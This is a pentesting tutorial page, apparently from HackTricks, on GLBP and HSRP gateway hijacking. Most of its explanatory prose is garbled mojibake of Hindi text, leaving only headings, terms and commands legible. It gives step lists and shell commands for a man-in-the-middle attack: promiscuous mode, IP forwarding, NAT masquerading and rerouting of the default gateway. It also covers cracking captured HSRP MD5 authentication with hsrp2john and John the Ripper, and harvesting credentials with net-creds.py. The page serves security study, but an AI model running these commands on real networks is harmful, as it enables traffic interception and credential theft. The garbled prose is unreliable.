# GLBP & HSRP Attacks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## FHRP Hijacking Overview

### Insights into FHRP
FHRP рдХреЛ рдиреЗрдЯрд╡рд░реНрдХ рдХреА рдордЬрдмреВрддреА рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬреЛ рдХрдИ рд░рд╛рдЙрдЯрд░ рдХреЛ рдПрдХрд▓ рд╡рд░реНрдЪреБрдЕрд▓ рдпреВрдирд┐рдЯ рдореЗрдВ рдорд┐рд▓рд╛рддрд╛ рд╣реИ, рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд▓реЛрдб рд╡рд┐рддрд░рдг рдФрд░ рджреЛрд╖ рд╕рд╣рд┐рд╖реНрдгреБрддрд╛ рдХреЛ рдмрдврд╝рд╛рддрд╛ рд╣реИред Cisco Systems рдиреЗ рдЗрд╕ рд╕реВрдЯ рдореЗрдВ рдкреНрд░рдореБрдЦ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдкреЗрд╢ рдХрд┐рдП, рдЬреИрд╕реЗ GLBP рдФрд░ HSRPред

### GLBP Protocol Insights
Cisco рдХрд╛ рдирд┐рд░реНрдорд╛рдг, GLBP, TCP/IP рд╕реНрдЯреИрдХ рдкрд░ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИ, рд╕рдВрдЪрд╛рд░ рдХреЗ рд▓рд┐рдП UDP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдкреЛрд░реНрдЯ 3222 рдкрд░ред GLBP рд╕рдореВрд╣ рдореЗрдВ рд░рд╛рдЙрдЯрд░ "рд╣реИрд▓реЛ" рдкреИрдХреЗрдЯ 3 рд╕реЗрдХрдВрдб рдХреЗ рдЕрдВрддрд░рд╛рд▓ рдкрд░ рдЖрджрд╛рди-рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВред рдпрджрд┐ рдХреЛрдИ рд░рд╛рдЙрдЯрд░ 10 рд╕реЗрдХрдВрдб рдХреЗ рд▓рд┐рдП рдЗрди рдкреИрдХреЗрдЯ рдХреЛ рднреЗрдЬрдиреЗ рдореЗрдВ рд╡рд┐рдлрд▓ рд░рд╣рддрд╛ рд╣реИ, рддреЛ рдЗрд╕реЗ рдСрдлрд╝рд▓рд╛рдЗрди рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдпреЗ рдЯрд╛рдЗрдорд░ рдирд┐рд╢реНрдЪрд┐рдд рдирд╣реАрдВ рд╣реИрдВ рдФрд░ рдЗрдиреНрд╣реЗрдВ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### GLBP Operations and Load Distribution
GLBP рд░рд╛рдЙрдЯрд░ рдХреЗ рдмреАрдЪ рд▓реЛрдб рд╡рд┐рддрд░рдг рдХреЛ рд╕рдХреНрд╖рдо рдмрдирд╛рдХрд░ рдЕрд▓рдЧ рдЦрдбрд╝рд╛ рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ рдПрдХрд▓ рд╡рд░реНрдЪреБрдЕрд▓ IP рдХреЗ рд╕рд╛рде рдХрдИ рд╡рд░реНрдЪреБрдЕрд▓ MAC рдкрддреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред GLBP рд╕рдореВрд╣ рдореЗрдВ, рдкреНрд░рддреНрдпреЗрдХ рд░рд╛рдЙрдЯрд░ рдкреИрдХреЗрдЯ рдлреЙрд░рд╡рд░реНрдбрд┐рдВрдЧ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИред HSRP/VRRP рдХреЗ рд╡рд┐рдкрд░реАрдд, GLBP рдХрдИ рддрдВрддреНрд░реЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд▓реЛрдб рд╕рдВрддреБрд▓рди рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ:

- **Host-Dependent Load Balancing:** рдПрдХ рд╣реЛрд╕реНрдЯ рдХреЛ рд╕реНрдерд┐рд░ AVF MAC рдкрддрд╛ рдЕрд╕рд╛рдЗрдирдореЗрдВрдЯ рдмрдирд╛рдП рд░рдЦрддрд╛ рд╣реИ, рдЬреЛ рд╕реНрдерд┐рд░ NAT рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИред
- **Round-Robin Load Balancing:** рдбрд┐рдлрд╝реЙрд▓реНрдЯ рджреГрд╖реНрдЯрд┐рдХреЛрдг, рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╣реЛрд╕реНрдЯреЛрдВ рдХреЗ рдмреАрдЪ AVF MAC рдкрддрд╛ рдЕрд╕рд╛рдЗрдирдореЗрдВрдЯ рдХреЛ рд╡реИрдХрд▓реНрдкрд┐рдХ рдХрд░рддрд╛ рд╣реИред
- **Weighted Round-Robin Load Balancing:** рдкреВрд░реНрд╡рдирд┐рд░реНрдзрд╛рд░рд┐рдд "рд╡рдЬрди" рдореИрдЯреНрд░рд┐рдХреНрд╕ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд▓реЛрдб рд╡рд┐рддрд░рд┐рдд рдХрд░рддрд╛ рд╣реИред

### Key Components and Terminologies in GLBP
- **AVG (Active Virtual Gateway):** рдореБрдЦреНрдп рд░рд╛рдЙрдЯрд░, рдЬреЛ рд╕рдордХрдХреНрд╖ рд░рд╛рдЙрдЯрд░ рдХреЛ MAC рдкрддреЗ рдЖрд╡рдВрдЯрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд┐рдореНрдореЗрджрд╛рд░ рд╣реИред
- **AVF (Active Virtual Forwarder):** рдПрдХ рд░рд╛рдЙрдЯрд░ рдЬрд┐рд╕реЗ рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд╝рд┐рдХ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд╛рдорд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
- **GLBP Priority:** рдПрдХ рдореИрдЯреНрд░рд┐рдХ рдЬреЛ AVG рдХреЛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬреЛ 100 рдХреЗ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реЗ рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИ рдФрд░ 1 рд╕реЗ 255 рдХреЗ рдмреАрдЪ рд╣реЛрддрд╛ рд╣реИред
- **GLBP Weight:** рдПрдХ рд░рд╛рдЙрдЯрд░ рдкрд░ рд╡рд░реНрддрдорд╛рди рд▓реЛрдб рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рдпрд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдЯреНрд░реИрдХрд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдорд╛рдпреЛрдЬрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
- **GLBP Virtual IP Address:** рд╕рднреА рдЬреБрдбрд╝реЗ рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП рдиреЗрдЯрд╡рд░реНрдХ рдХрд╛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЧреЗрдЯрд╡реЗ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИред

рдЗрдВрдЯрд░реИрдХреНрд╢рди рдХреЗ рд▓рд┐рдП, GLBP рдЖрд░рдХреНрд╖рд┐рдд рдорд▓реНрдЯреАрдХрд╛рд╕реНрдЯ рдкрддреЗ 224.0.0.102 рдФрд░ UDP рдкреЛрд░реНрдЯ 3222 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рд░рд╛рдЙрдЯрд░ 3 рд╕реЗрдХрдВрдб рдХреЗ рдЕрдВрддрд░рд╛рд▓ рдкрд░ "рд╣реИрд▓реЛ" рдкреИрдХреЗрдЯ рднреЗрдЬрддреЗ рд╣реИрдВ, рдФрд░ рдпрджрд┐ 10 рд╕реЗрдХрдВрдб рдХреЗ рджреМрд░рд╛рди рдХреЛрдИ рдкреИрдХреЗрдЯ рдЫреВрдЯ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЙрдиреНрд╣реЗрдВ рдЧреИрд░-рдХрд╛рд░реНрдпрд╛рддреНрдордХ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред

### GLBP Attack Mechanism
рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЙрдЪреНрдЪрддрдо рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рдорд╛рди (255) рдХреЗ рд╕рд╛рде GLBP рдкреИрдХреЗрдЯ рднреЗрдЬрдХрд░ рдкреНрд░рд╛рдердорд┐рдХ рд░рд╛рдЙрдЯрд░ рдмрди рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рд╕реЗ DoS рдпрд╛ MITM рд╣рдорд▓реЛрдВ рдХрд╛ рдХрд╛рд░рдг рдмрди рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХрд╛ рдЕрд╡рд░реЛрдзрди рдпрд╛ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИред

### Executing a GLBP Attack with Loki
[Loki](https://github.com/raizo62/loki_on_kali) рдПрдХ GLBP рд╣рдорд▓реЗ рдХреЛ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рдФрд░ рд╡рдЬрди рдХреЛ 255 рдкрд░ рд╕реЗрдЯ рдХрд░рдХреЗ рдкреИрдХреЗрдЯ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдХреЗ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рд╣рдорд▓реЗ рд╕реЗ рдкрд╣рд▓реЗ рдХреЗ рдЪрд░рдгреЛрдВ рдореЗрдВ рд╡рд░реНрдЪреБрдЕрд▓ IP рдкрддрд╛, рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐, рдФрд░ рд░рд╛рдЙрдЯрд░ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рдорд╛рдиреЛрдВ рдЬреИрд╕реА рдЬрд╛рдирдХрд╛рд░реА рдЗрдХрдЯреНрдард╛ рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ Wireshark рдЬреИрд╕реЗ рдЙрдкрдХрд░рдгреЛрдВ рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

Attack Steps:
1. рдкреНрд░рдорд┐рд╕реНрдХреНрдпреВрд╕ рдореЛрдб рдореЗрдВ рд╕реНрд╡рд┐рдЪ рдХрд░реЗрдВ рдФрд░ IP рдлреЙрд░рд╡рд░реНрдбрд┐рдВрдЧ рд╕рдХреНрд╖рдо рдХрд░реЗрдВред
2. рд▓рдХреНрд╖рд┐рдд рд░рд╛рдЙрдЯрд░ рдХреА рдкрд╣рдЪрд╛рди рдХрд░реЗрдВ рдФрд░ рдЗрд╕рдХрд╛ IP рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред
3. рдПрдХ Gratuitous ARP рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВред
4. AVG рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рддреЗ рд╣реБрдП рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг GLBP рдкреИрдХреЗрдЯ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░реЗрдВред
5. рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдиреЗрдЯрд╡рд░реНрдХ рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЛ GLBP рд╡рд░реНрдЪреБрдЕрд▓ IP рдХреЛ рджрд░реНрд╢рд╛рддреЗ рд╣реБрдП рдПрдХ рджреНрд╡рд┐рддреАрдпрдХ IP рдкрддрд╛ рдЕрд╕рд╛рдЗрди рдХрд░реЗрдВред
6. рдкреВрд░реНрдг рдЯреНрд░реИрдлрд╝рд┐рдХ рджреГрд╢реНрдпрддрд╛ рдХреЗ рд▓рд┐рдП SNAT рд▓рд╛рдЧреВ рдХрд░реЗрдВред
7. рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдореВрд▓ AVG рд░рд╛рдЙрдЯрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЗрдВрдЯрд░рдиреЗрдЯ рдПрдХреНрд╕реЗрд╕ рдЬрд╛рд░реА рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рд░рд╛рдЙрдЯрд┐рдВрдЧ рдХреЛ рд╕рдорд╛рдпреЛрдЬрд┐рдд рдХрд░реЗрдВред

рдЗрди рдЪрд░рдгреЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдХреЗ, рд╣рдорд▓рд╛рд╡рд░ "рдореИрди рдЗрди рдж рдорд┐рдбрд▓" рдХреЗ рд░реВрдк рдореЗрдВ рдЦреБрдж рдХреЛ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХрд╛ рдЕрд╡рд░реЛрдзрди рдФрд░ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдпрд╛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред

For demonstration, here are the required command snippets:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
Monitoring and intercepting traffic can be done using net-creds.py or similar tools to capture and analyze data flowing through the compromised network.

### Passive Explanation of HSRP Hijacking with Command Details

#### Overview of HSRP (Hot Standby Router/Redundancy Protocol)
HSRP рдПрдХ Cisco рдХрд╛ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рд╡рд╛рд▓рд╛ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИ рдЬрд┐рд╕реЗ рдиреЗрдЯрд╡рд░реНрдХ рдЧреЗрдЯрд╡реЗ рдХреА рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпрд╣ рдПрдХ рд╕рд╛рдЭрд╛ IP рдкрддреЗ рдХреЗ рд╕рд╛рде рдХрдИ рднреМрддрд┐рдХ рд░рд╛рдЙрдЯрд░реЛрдВ рдХреЛ рдПрдХрд▓ рддрд╛рд░реНрдХрд┐рдХ рдЗрдХрд╛рдИ рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЗрд╕ рддрд╛рд░реНрдХрд┐рдХ рдЗрдХрд╛рдИ рдХрд╛ рдкреНрд░рдмрдВрдзрди рдПрдХ рдкреНрд░рд╛рдердорд┐рдХ рд░рд╛рдЙрдЯрд░ рджреНрд╡рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд┐рдореНрдореЗрджрд╛рд░ рд╣реЛрддрд╛ рд╣реИред GLBP рдХреЗ рд╡рд┐рдкрд░реАрдд, рдЬреЛ рд▓реЛрдб рд╕рдВрддреБрд▓рди рдХреЗ рд▓рд┐рдП рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рдФрд░ рд╡рдЬрди рдЬреИрд╕реЗ рдореИрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, HSRP рдЯреНрд░реИрдлрд╝рд┐рдХ рдкреНрд░рдмрдВрдзрди рдХреЗ рд▓рд┐рдП рдПрдХрд▓ рд╕рдХреНрд░рд┐рдп рд░рд╛рдЙрдЯрд░ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред

#### Roles and Terminology in HSRP
- **HSRP Active Router**: рдЧреЗрдЯрд╡реЗ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдЙрдкрдХрд░рдг, рдЯреНрд░реИрдлрд╝рд┐рдХ рдкреНрд░рд╡рд╛рд╣ рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд░рддрд╛ рд╣реИред
- **HSRP Standby Router**: рдПрдХ рдмреИрдХрдЕрдк рд░рд╛рдЙрдЯрд░, рдЬреЛ рд╕рдХреНрд░рд┐рдп рд░рд╛рдЙрдЯрд░ рдХреЗ рд╡рд┐рдлрд▓ рд╣реЛрдиреЗ рдкрд░ рдХрд╛рд░реНрдпрднрд╛рд░ рд╕рдВрднрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рд╣реИред
- **HSRP Group**: рд░рд╛рдЙрдЯрд░реЛрдВ рдХрд╛ рдПрдХ рд╕реЗрдЯ рдЬреЛ рдПрдХрд▓ рд▓рдЪреАрд▓рд╛ рд╡рд░реНрдЪреБрдЕрд▓ рд░рд╛рдЙрдЯрд░ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рд╣рдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред
- **HSRP MAC Address**: HSRP рд╕реЗрдЯрдЕрдк рдореЗрдВ рддрд╛рд░реНрдХрд┐рдХ рд░рд╛рдЙрдЯрд░ рдХреЛ рдЕрд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдПрдХ рд╡рд░реНрдЪреБрдЕрд▓ MAC рдкрддрд╛ред
- **HSRP Virtual IP Address**: HSRP рд╕рдореВрд╣ рдХрд╛ рд╡рд░реНрдЪреБрдЕрд▓ IP рдкрддрд╛, рдЬреЛ рдЬреБрдбрд╝реЗ рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЧреЗрдЯрд╡реЗ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИред

#### HSRP Versions
HSRP рджреЛ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ рдЖрддрд╛ рд╣реИ, HSRPv1 рдФрд░ HSRPv2, рдЬреЛ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рд╕рдореВрд╣ рдХреНрд╖рдорддрд╛, рдорд▓реНрдЯреАрдХрд╛рд╕реНрдЯ IP рдЙрдкрдпреЛрдЧ рдФрд░ рд╡рд░реНрдЪреБрдЕрд▓ MAC рдкрддрд╛ рд╕рдВрд░рдЪрдирд╛ рдореЗрдВ рднрд┐рдиреНрди рд╣реЛрддреЗ рд╣реИрдВред рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╕реЗрд╡рд╛ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рдЖрджрд╛рди-рдкреНрд░рджрд╛рди рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢рд┐рд╖реНрдЯ рдорд▓реНрдЯреАрдХрд╛рд╕реНрдЯ IP рдкрддреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рд╣рд░ 3 рд╕реЗрдХрдВрдб рдореЗрдВ Hello рдкреИрдХреЗрдЯ рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВред рдпрджрд┐ 10 рд╕реЗрдХрдВрдб рдХреЗ рдЕрдВрддрд░рд╛рд▓ рдореЗрдВ рдХреЛрдИ рдкреИрдХреЗрдЯ рдкреНрд░рд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд░рд╛рдЙрдЯрд░ рдХреЛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред

#### HSRP Attack Mechanism
HSRP рд╣рдорд▓реЗ рд╕рдХреНрд░рд┐рдп рд░рд╛рдЙрдЯрд░ рдХреА рднреВрдорд┐рдХрд╛ рдХреЛ рдЕрдзрд┐рдХрддрдо рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рдорд╛рди рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдХреЗ рдмрд▓рд╛рддреНрдХреГрдд рдХрд░рдиреЗ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрддреЗ рд╣реИрдВред рдЗрд╕рд╕реЗ рдПрдХ Man-In-The-Middle (MITM) рд╣рдорд▓рд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдЖрд╡рд╢реНрдпрдХ рдкреВрд░реНрд╡-рд╣рдорд▓рд╛ рдХрджрдореЛрдВ рдореЗрдВ HSRP рд╕реЗрдЯрдЕрдк рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдбреЗрдЯрд╛ рдПрдХрддреНрд░ рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ, рдЬрд┐рд╕реЗ рдЯреНрд░реИрдлрд╝рд┐рдХ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХреЗ рд▓рд┐рдП Wireshark рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

#### Steps for Bypassing HSRP Authentication
1. HSRP рдбреЗрдЯрд╛ рд╡рд╛рд▓реЗ рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ .pcap рдлрд╝рд╛рдЗрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рд╕рд╣реЗрдЬреЗрдВред
```shell
tcpdump -w hsrp_traffic.pcap
```
2. hsrp2john.py рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ .pcap рдлрд╝рд╛рдЗрд▓ рд╕реЗ MD5 рд╣реИрд╢ рдирд┐рдХрд╛рд▓реЗрдВред
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. John the Ripper рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ MD5 рд╣реИрд╢ рдХреЛ рдХреНрд░реИрдХ рдХрд░реЗрдВред
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Executing HSRP Injection with Loki**

1. HSRP рд╡рд┐рдЬреНрдЮрд╛рдкрдиреЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП Loki рд▓реЙрдиреНрдЪ рдХрд░реЗрдВред
2. рдиреЗрдЯрд╡рд░реНрдХ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдХреЛ рдкреНрд░рдорд┐рд╕реНрдХреНрдпреВрдЕрд╕ рдореЛрдб рдореЗрдВ рд╕реЗрдЯ рдХрд░реЗрдВ рдФрд░ IP рдлреЙрд░рд╡рд░реНрдбрд┐рдВрдЧ рд╕рдХреНрд╖рдо рдХрд░реЗрдВред
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Loki рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд░рд╛рдЙрдЯрд░ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░реЗрдВ, рдХреНрд░реИрдХ рдХрд┐рдпрд╛ рдЧрдпрд╛ HSRP рдкрд╛рд╕рд╡рд░реНрдб рджрд░реНрдЬ рдХрд░реЗрдВ, рдФрд░ рд╕рдХреНрд░рд┐рдп рд░рд╛рдЙрдЯрд░ рдХреА рдирдХрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд░реЗрдВред
4. рд╕рдХреНрд░рд┐рдп рд░рд╛рдЙрдЯрд░ рдХреА рднреВрдорд┐рдХрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рдЕрдкрдиреЗ рдиреЗрдЯрд╡рд░реНрдХ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдФрд░ IP рдЯреЗрдмрд▓ рдХреЛ рд╡реИрдз рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВред
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. рд░рд╛рдЙрдЯрд┐рдВрдЧ рддрд╛рд▓рд┐рдХрд╛ рдХреЛ рдкреВрд░реНрд╡ рд╕рдХреНрд░рд┐рдп рд░рд╛рдЙрдЯрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рд░реВрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВред
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯреЗрдб рдЯреНрд░реИрдлрд╝рд┐рдХ рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП net-creds.py рдпрд╛ рд╕рдорд╛рди рдЙрдкрдпреЛрдЧрд┐рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
```shell
sudo python2 net-creds.py -i eth0
```

